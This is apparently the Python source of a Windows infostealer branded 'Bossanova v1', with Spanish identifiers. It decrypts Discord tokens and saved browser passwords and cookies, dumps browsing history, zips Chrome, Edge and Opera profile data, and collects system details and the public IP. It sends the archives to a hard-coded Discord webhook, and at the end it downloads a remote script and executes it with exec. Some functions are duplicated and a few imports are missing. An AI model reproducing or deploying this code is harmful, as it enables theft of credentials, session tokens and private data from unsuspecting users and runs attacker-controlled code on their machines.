from Crypto.Cipher import AES
import base64
import io
import json
import os
import platform
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import time
import win32crypt
import pyautogui
from PIL import Image
import requests

def get_master_key():
  appdata = os.getenv("APPDATA")
  if not appdata:
    return None

  local_state_path = os.path.join(appdata, "discord", "Local State")
  if not os.path.exists(local_state_path):
    local_appdata = os.getenv("LOCALAPPDATA")
    if local_appdata:
      local_state_path = os.path.join(local_appdata, "Discord", "Local State")

  if not os.path.exists(local_state_path):
    return None

  try:
    with open(local_state_path, "r", encoding="utf-8") as f:
      local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
  except Exception:
    return None


def decrypt_val(buff, master_key):
  try:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)[:-16].decode(
        "utf-8", errors="ignore"
    )
    return decrypted_pass
  except Exception:
    return None


def obtener_tokens_reales():
  master_key = get_master_key()
  if not master_key:
    return []

  tokens = []
  leveldb_path = os.path.join(
      os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"
  )

  if not os.path.exists(leveldb_path):
    return []

  for file in os.listdir(leveldb_path):
    if file.endswith(".ldb") or file.endswith(".log"):
      file_path = os.path.join(leveldb_path, file)
      try:
        with open(file_path, "rb") as f:
          content = f.read()

        pos = 0
        while True:
          pos = content.find(b"dQw4w9WgXcQ:", pos)
          if pos == -1:
            break

          try:
            end_pos = content.find(b'"', pos)
            if end_pos == -1:
              end_pos = pos + 150

            encrypted_block = content[pos:end_pos]
            if b":" in encrypted_block:
              raw_data = base64.b64decode(encrypted_block.split(b":")[1])
              token = decrypt_val(raw_data, master_key)
              if token and token not in tokens:
                tokens.append(token)
          except Exception:
            pass

          pos += len(b"dQw4w9WgXcQ:")
      except Exception:
        continue

  return tokens


def generar_archivo_historial():
  local_appdata = os.getenv("LOCALAPPDATA")
  appdata = os.getenv("APPDATA")
  txt_path = os.path.join(tempfile.gettempdir(), "historial_global.txt")

  if not local_appdata or not appdata:
    with open(txt_path, "w", encoding="utf-8") as f:
      f.write("No se pudieron obtener las rutas de AppData.")
    return txt_path

  navegadores = {
      "Google Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
      "Brave": os.path.join(
          local_appdata, "BraveSoftware", "Brave-Browser", "User Data"
      ),
      "Microsoft Edge": os.path.join(
          local_appdata, "Microsoft", "Edge", "User Data"
      ),
      "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable"),
  }

  temp_dir = tempfile.gettempdir()

  with open(txt_path, "w", encoding="utf-8") as f_out:
    f_out.write("=== HISTORIAL ===\n\n")

    for nav_nombre, base_path in navegadores.items():
      if not os.path.exists(base_path):
        continue

      perfiles = ["Default"]
      try:
        for item in os.listdir(base_path):
          ruta_item = os.path.join(base_path, item)
          if os.path.isdir(ruta_item) and (
              item.startswith("Profile ")
              or item == "Guest Profile"
              or item == "System Profile"
          ):
            perfiles.append(item)
      except Exception:
        pass

      for perfil in perfiles:
        if nav_nombre == "Opera Stable":
          history_path = os.path.join(base_path, "History")
          if not os.path.exists(history_path):
            history_path = os.path.join(base_path, perfil, "History")
        else:
          history_path = os.path.join(base_path, perfil, "History")

        if not os.path.exists(history_path):
          continue

        temp_history = os.path.join(
            temp_dir, f"history_{nav_nombre.replace(' ', '_')}_{perfil}"
        )

        try:
          shutil.copy2(history_path, temp_history)
          conn = sqlite3.connect(temp_history)
          cursor = conn.cursor()

          query = """
                        SELECT url, title, last_visit_time 
                        FROM urls 
                        ORDER BY last_visit_time DESC
                    """
          cursor.execute(query)
          rows = cursor.fetchall()

          f_out.write(
              f"\n--- [ Navegador: {nav_nombre} | Perfil: {perfil} ] ---\n"
          )
          for row in rows:
            url, title, _ = row
            titulo_seguro = title if title else "Sin título"
            f_out.write(
                f"Título: {titulo_seguro}\nURL:"
                f" {url}\n----------------------------------------\n"
            )

          cursor.close()
          conn.close()
        except Exception:
          pass
        finally:
          if os.path.exists(temp_history):
            try:
              os.remove(temp_history)
            except:
              pass

  return txt_path


def empaquetar_network(browser="chrome"):
    browser = browser.lower()
    appdata_local = os.path.join(os.path.expanduser("~"), "AppData", "Local")
    appdata_roaming = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
    
    target_dir = None
    
    if browser == "chrome":
        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "Network")
    elif browser == "edge":
        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "Network")
    elif browser == "opera":
        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default", "Network")
    elif browser == "operagx":
        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default", "Network")
    elif browser == "firefox":
        target_dir = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles", "mipt27ed.default-release")
    else:
        return None

    if not target_dir or not os.path.exists(target_dir):
        return None

    temp_dir = tempfile.gettempdir()
    staging_dir = os.path.join(temp_dir, f"{browser}_network_staging")
    zip_base_path = os.path.join(temp_dir, f"{browser}_network_data")

    try:
        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)
        os.makedirs(staging_dir, exist_ok=True)

        for item in os.listdir(target_dir):
            source_item = os.path.join(target_dir, item)
            target_item = os.path.join(staging_dir, item)
            try:

                if browser == "firefox" and not item.startswith("cookies.sqlite"):
                    continue
                
                if os.path.isdir(source_item):
                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
                else:
                    shutil.copy2(source_item, target_item)
            except Exception:
                pass

        shutil.make_archive(zip_base_path, "zip", staging_dir)
        final_zip_file = zip_base_path + ".zip"

        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)

        return final_zip_file
    except Exception:
        return None

def filetime_to_datetime(ts):
    return datetime(1601, 1, 1) + timedelta(microseconds=ts)

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def decode_cli_key(s):
    if s is None:
        return None
    base64_key = base64.b64encode(s.encode())
    as_txt = base64.b64decode(base64_key).decode('utf-8').replace('\\x', '')
    return binascii.unhexlify(bytearray(as_txt, 'utf-8'))

def decrypt_data(encrypted_junk, key, master_key=None, password=False):
    try:
        version = encrypted_junk[:3]
        if version in (b'v10', b'v11'):
            if password:
                initialisation_vector = encrypted_junk[3:15]
                encrypted_password = encrypted_junk[15:-16]
                cipher = AES.new(master_key, AES.MODE_GCM, initialisation_vector)
                return cipher.decrypt(encrypted_password).decode()
            nonce = encrypted_junk[3:3 + 12]
            if len(nonce) == 0:
                return ""
            cipher_text = encrypted_junk[3+12:-16]
            plain_text = AES.new(key, AES.MODE_GCM, nonce)
            text = plain_text.decrypt(cipher_text)
            return text[32:].decode('utf-8')
        elif version in (b'v20'):
            nonce = encrypted_junk[3:3 + 12]
            if len(nonce) == 0:
                return ""
            cipher_text = encrypted_junk[3+12:-16]
            plain_text = AES.new(key, AES.MODE_GCM, nonce)
            text = plain_text.decrypt(cipher_text)
            return text.decode('utf-8') if password else text[32:].decode('utf-8')
    except Exception:
        return ""
    return ""

def extraer_datos_navegador(browser_name, profile_path, key):
    """Extrae cookies y credenciales de las bases de datos de forma segura."""
    resultados = {"cookies": [], "passwords": []}
    
    cookie_db = os.path.join(profile_path, "Network", "Cookies")
    login_db = os.path.join(profile_path, "Login Data")
    
    # Procesar Cookies
    if os.path.exists(cookie_db):
        temp_cookie_db = os.path.join(tempfile.gettempdir(), f"cookies_{browser_name}.db")
        try:
            shutil.copy2(cookie_db, temp_cookie_db)
            conn = sqlite3.connect(temp_cookie_db)
            cursor = conn.cursor()
            cursor.execute('select host_key, path, name, CAST(encrypted_value AS BLOB) from cookies')
            for host_key, path, name, encrypted_value in cursor.fetchall():
                val = decrypt_data(encrypted_value, key, None, False)
                if val:
                    resultados["cookies"].append({"domain": host_key, "name": name, "value": val})
            conn.close()
            os.remove(temp_cookie_db)
        except Exception:
            pass

    # Procesar Contraseñas
    if os.path.exists(login_db):
        temp_login_db = os.path.join(tempfile.gettempdir(), f"logins_{browser_name}.db")
        try:
            shutil.copy2(login_db, temp_login_db)
            conn = sqlite3.connect(temp_login_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for origin_url, username_value, password_value in cursor.fetchall():
                pwd = decrypt_data(password_value, key, None, True)
                if pwd and username_value:
                    resultados["passwords"].append({"url": origin_url, "user": username_value, "pass": pwd})
            conn.close()
            os.remove(temp_login_db)
        except Exception:
            pass
            
    return resultados

def capturar_pantalla_jpg():
  try:
    
    screenshot = pyautogui.screenshot()

    
    img_byte_arr = io.BytesIO()
    
    rgb_im = screenshot.convert("RGB")
    rgb_im.save(img_byte_arr, format="JPEG", quality=85)
    img_byte_arr.seek(0)
    return img_byte_arr
  except Exception:
    return None


######## Webhook y Configuración ##############################################

WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1560604217654386858/RcEuKQFGc-pguKLBFfaUmepTYVNlPlF0yzr1o-UAF-goZL7JCdt9Ifbi3lr-c_npaC3e"

def filetime_to_datetime(ts):
    return datetime(1601, 1, 1) + timedelta(microseconds=ts)

def decrypt_data(encrypted_junk, key, master_key=None, password=False):
    try:
        version = encrypted_junk[:3]
        if version in (b'v10', b'v11'):
            if password:
                initialisation_vector = encrypted_junk[3:15]
                encrypted_password = encrypted_junk[15:-16]
                cipher = AES.new(master_key, AES.MODE_GCM, initialisation_vector)
                return cipher.decrypt(encrypted_password).decode()
            nonce = encrypted_junk[3:3 + 12]
            if len(nonce) == 0:
                return ""
            cipher_text = encrypted_junk[3+12:-16]
            plain_text = AES.new(key, AES.MODE_GCM, nonce)
            text = plain_text.decrypt(cipher_text)
            return text[32:].decode('utf-8')
        elif version in (b'v20'):
            nonce = encrypted_junk[3:3 + 12]
            if len(nonce) == 0:
                return ""
            cipher_text = encrypted_junk[3+12:-16]
            plain_text = AES.new(key, AES.MODE_GCM, nonce)
            text = plain_text.decrypt(cipher_text)
            return text.decode('utf-8') if password else text[32:].decode('utf-8')
    except Exception:
        return ""
    return ""

def extraer_credenciales_navegador(browser_name, profile_path, key):
    """Extrae cookies y contraseñas de las bases de datos del navegador."""
    resultados = {"cookies": [], "passwords": []}
    
    # Rutas comunes en Chromium (Chrome, Edge, etc.)
    cookie_db = os.path.join(profile_path, "Network", "Cookies")
    login_db = os.path.join(profile_path, "Login Data")
    
    # Procesar Cookies
    if os.path.exists(cookie_db):
        temp_cookie_db = os.path.join(tempfile.gettempdir(), f"cookies_{browser_name}.db")
        try:
            shutil.copy2(cookie_db, temp_cookie_db)
            conn = sqlite3.connect(temp_cookie_db)
            cursor = conn.cursor()
            cursor.execute('select host_key, path, name, CAST(encrypted_value AS BLOB) from cookies')
            for host_key, path, name, encrypted_value in cursor.fetchall():
                val = decrypt_data(encrypted_value, key, None, False)
                if val:
                    resultados["cookies"].append(f"Domain: {host_key} | Name: {name} | Value: {val}")
            conn.close()
            os.remove(temp_cookie_db)
        except Exception:
            pass

    # Procesar Contraseñas
    if os.path.exists(login_db):
        temp_login_db = os.path.join(tempfile.gettempdir(), f"logins_{browser_name}.db")
        try:
            shutil.copy2(login_db, temp_login_db)
            conn = sqlite3.connect(temp_login_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for origin_url, username_value, password_value in cursor.fetchall():
                pwd = decrypt_data(password_value, key, None, True)
                if pwd and username_value:
                    resultados["passwords"].append(f"URL: {origin_url} | User: {username_value} | Pass: {pwd}")
            conn.close()
            os.remove(temp_login_db)
        except Exception:
            pass
            
    return resultados

######## Funciones de Recopilación del Sistema (webhook.txt) ####################

def empaquetar_network(browser="chrome"):
    browser = browser.lower()
    appdata_local = os.path.join(os.path.expanduser("~"), "AppData", "Local")
    appdata_roaming = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
    
    target_dir = None
    if browser == "chrome":
        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default")
    elif browser == "edge":
        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default")
    elif browser == "opera":
        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default")
    elif browser == "operagx":
        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default")
    else:
        return None

    if not target_dir or not os.path.exists(target_dir):
        return None

    temp_dir = tempfile.gettempdir()
    staging_dir = os.path.join(temp_dir, f"{browser}_staging")
    zip_base_path = os.path.join(temp_dir, f"{browser}_data")

    try:
        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)
        os.makedirs(staging_dir, exist_ok=True)

        # Copiar carpetas clave de perfil (Network, Local Storage, etc.)
        for item in ["Network", "Local Storage", "Login Data", "Cookies"]:
            src_item = os.path.join(target_dir, item)
            if os.path.exists(src_item):
                if os.path.isdir(src_item):
                    shutil.copytree(src_item, os.path.join(staging_dir, item), dirs_exist_ok=True)
                else:
                    shutil.copy2(src_item, staging_dir)

        shutil.make_archive(zip_base_path, "zip", staging_dir)
        shutil.rmtree(staging_dir, ignore_errors=True)
        return zip_base_path + ".zip"
    except Exception:
        return None


def obtener_info_pc():
    info_sistema = {}
    try:
        cmd_cpu = "wmic cpu get name"
        procesador = subprocess.check_output(cmd_cpu, shell=True).decode("utf-8", errors="ignore").split("\n")[1].strip()
        info_sistema["procesador"] = procesador if procesador else "Desconocido"
    except Exception:
        info_sistema["procesador"] = platform.processor() or "Desconocido"

    info_sistema["os"] = f"{platform.system()} {platform.release()} ({platform.version()})"
    info_sistema["nombre_pc"] = socket.gethostname()

    try:
        info_sistema["ip_local"] = socket.gethostbyname(info_sistema["nombre_pc"])
    except Exception:
        info_sistema["ip_local"] = "No disponible"

    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        info_sistema["ip_publica"] = response.json().get("ip", "No disponible")
    except Exception:
        info_sistema["ip_publica"] = "No disponible"

    return info_sistema


def enviar_reporte_completo():
    datos_pc = obtener_info_pc()

    descripcion = (
        f" **PC:** `{datos_pc['nombre_pc']}`\n"
        f" **OS:** `{datos_pc['os']}`\n"
        f" **Procesador:** `{datos_pc['procesador']}`\n"
        f" **IP Local:** `{datos_pc['ip_local']}`\n"
        f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
        f"---\n"
    )

    payload = {
        "embeds": [{
            "title": "Bossanova v1 - Integración Webhook",
            "description": descripcion,
            "color": 5814783,
            "footer": {"text": "Por BossaNova"},
        }]
    }

    # Empaquetar datos de navegadores
    navegadores = ["chrome", "edge", "opera", "operagx"]
    zip_paths = {}
    for nav in navegadores:
        zp = empaquetar_network(nav)
        if zp and os.path.exists(zp):
            zip_paths[nav] = zp

    files = {}
    open_files = []
    try:
        file_idx = 1
        for nav, zp in zip_paths.items():
            f_zip = open(zp, "rb")
            open_files.append(f_zip)
            files[f"file{file_idx}"] = (f"{nav}_data.zip", f_zip, "application/zip")
            file_idx += 1

        requests.post(
            WEBHOOK_URL_UNICO,
            data={"payload_json": json.dumps(payload)},
            files=files,
        )
    except Exception:
        pass
    finally:
        for f in open_files:
            try:
                f.close()
            except:
                pass

        for zp in zip_paths.values():
            if os.path.exists(zp):
                try:
                    os.remove(zp)
                except:
                    pass

if __name__ == "__main__":
    enviar_reporte_completo()
  
try:
  import urllib.request

  url_v11 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v11.py'
  with urllib.request.urlopen(url_v11) as response:
    exec(response.read().decode('utf-8'))
except:
  pass
